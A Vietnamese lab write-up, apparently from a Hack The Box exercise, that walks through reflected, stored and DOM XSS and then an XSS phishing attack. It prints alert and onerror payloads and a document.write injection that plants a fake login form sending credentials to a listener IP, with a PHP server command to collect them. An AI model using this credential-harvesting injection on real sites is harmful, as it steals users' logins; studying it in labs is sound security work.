# Reflected XSS

![Screenshot 2025-05-09 012554](https://github.com/user-attachments/assets/a9bf5e3b-80e3-4c0c-9469-858fe8a31364)

![Screenshot 2025-05-09 013154](https://github.com/user-attachments/assets/d315fd9f-8b40-4742-bebb-1673aa5f4f35)

> <script>alert('heloooo')</script>

![Screenshot 2025-05-09 013237](https://github.com/user-attachments/assets/b7cf1b2b-1be1-42be-a64b-8dd5a693aee3)

![image](https://github.com/user-attachments/assets/3cf85edc-c839-4f7d-a543-c4cfa3fcd176)

# Stored XSS cũng giống 

Xuất hiện mỗi lần bạn mở lại trang (mà bạn không cần gửi lại dữ liệu từ input hay URL) 

# DOM XSS

![image](https://github.com/user-attachments/assets/10427616-f046-4fa7-931e-06e663b051d6)

Lần này payload không hoạt động, vì payload được gán thẳng vào innerHTML

![image](https://github.com/user-attachments/assets/82bc8f55-fa28-444a-aaa3-77026b2a06fb)

Có lẻ innerHTML không chạy các thẻ <script> nhưng <img thì được

Ta sẽ gửi một payload như sau 

> <img src="" onerror="alert('aaaa')>

khi ảnh không được tải lên thì sự kiện onerror sẽ thực thi và khi đó

![image](https://github.com/user-attachments/assets/3a98aa17-0013-4485-b1ce-11f96f4475be)

# Phisinggg

![Screenshot 2025-05-09 142539](https://github.com/user-attachments/assets/9523ba51-a53f-4500-adf7-ba65a032a4fc)

Nó cho phép ta nhập vào 1 url hình ảnh vào hiển thị chúng 

![Screenshot 2025-05-09 143254](https://github.com/user-attachments/assets/43d153eb-ee6e-43d7-b98c-2bc5937a1e58)
![Screenshot 2025-05-09 143349](https://github.com/user-attachments/assets/3fd6f1d2-26e7-487e-8cf5-55cab3cdf3ef)

Tiếp theo tôi sẽ tiêm vào một form đăng nhập

![Screenshot 2025-05-09 144552](https://github.com/user-attachments/assets/ce5847b0-92c3-4ec4-9601-3e6b61436cf0)

Tiếp theo tôi chuẩn bị mã XSS thử nghiệm trên biểu mẫu dễ bị tấn công trên, tôi sử dụng hàm trong javascript là document.write() nó có chức năng ghi nội dung trực tiếp ra trang html.

``` document.write('<h3>Please login to continue</h3><form action=http://10.10.15.205><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form><script>document.getElementById('urlform')?.remove()</script><!-- ```

10.10.15.205 sẽ là IP của máy mà chúng ta dùng để lắng nghe thông tin của nạn nhân

Ta được 1 form đăng nhập như này

![image](https://github.com/user-attachments/assets/d656c6e6-0ad3-4f17-a89e-e42d2683fde3)

Bây giờ ta phải làm sao để khi nạn nhân đăng nhập nó sẽ chuyển hướng đến giao diện nhập url ban đầu

![image](https://github.com/user-attachments/assets/d21c5e33-5763-4a31-99db-d3c0c69a97e7)

Ta tạo 1 thư mục tạm vào chèn đoạn mã sao vào file index.php

![image](https://github.com/user-attachments/assets/9f5f9acf-e211-4f7d-9699-4a016774934f)


Bây giờ chúng ta khởi động máy chủ php để lắng nghe, có thể sử dụng thay cho netcat

> sudo php -S 0.0.0.0:80

![image](https://github.com/user-attachments/assets/8b5996ef-2180-47a4-9f3c-7391426002e4)

Ta được thông tin của nạn nhân, Ví dụ nếu trang web hackthebox.com có lỗi tương tự thì ta sẽ có được tài khoảng htb của nạn nhân



















